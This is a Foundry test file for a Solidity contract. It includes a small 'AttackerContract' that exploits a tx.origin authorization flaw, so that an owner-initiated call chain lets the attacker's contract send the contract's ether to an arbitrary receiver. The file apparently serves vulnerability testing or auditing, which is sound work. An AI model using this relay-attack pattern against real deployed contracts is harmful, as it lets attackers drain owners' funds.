
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MyContract} from "../src/MyContract.sol";

contract TestAccessControlMyContract is Test {

    MyContract public _contractUnderTest;
    address public owner;

    function setUp() public {
        owner = address(this);
        _contractUnderTest = new MyContract();
        vm.deal(address(_contractUnderTest), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller, address payable receiver, uint256 amount) public {
        
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner (the privileged role)
        vm.assume(caller != owner);
        
        // Constrain receiver to be a valid address
        vm.assume(receiver != address(0));
        vm.assume(receiver != address(vm));
        vm.assume(receiver != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Constrain amount to be within contract balance
        vm.assume(amount > 0 && amount <= address(_contractUnderTest).balance);

        // --- 2. State Configuration ---
        uint256 receiverBalanceBefore = receiver.balance;
        
        // --- 3. Execution & Assertion ---
        
        // The vulnerability is in the use of tx.origin instead of msg.sender.
        // tx.origin will be the EOA that initiated the transaction chain.
        // When the owner (this test contract) calls a malicious contract,
        // and that malicious contract calls sendTo, tx.origin is still the owner.
        
        // Create a malicious intermediary contract scenario
        // The caller (arbitrary user) deploys and uses an attack contract
        // But for this to work, the owner must initiate the tx chain.
        
        // Simulating: Owner initiates tx -> Attacker's contract -> sendTo
        // tx.origin = owner, msg.sender = attacker's contract
        
        // Deploy an attacker contract that will call sendTo
        AttackerContract attacker = new AttackerContract(address(_contractUnderTest));
        
        // The owner (this contract) calls the attacker's malicious function
        // This simulates a phishing attack where owner interacts with malicious contract
        attacker.attack(receiver, amount);
        
        // Assert that the transfer happened (proving the vulnerability)
        assertEq(receiver.balance, receiverBalanceBefore + amount, "Funds should have been transferred via tx.origin exploit");
    }
}

contract AttackerContract {
    MyContract public target;
    
    constructor(address _target) {
        target = MyContract(_target);
    }
    
    function attack(address payable receiver, uint256 amount) external {
        // When this is called by the owner, tx.origin == owner
        // even though msg.sender to sendTo is this attacker contract
        target.sendTo(receiver, amount);
    }
}
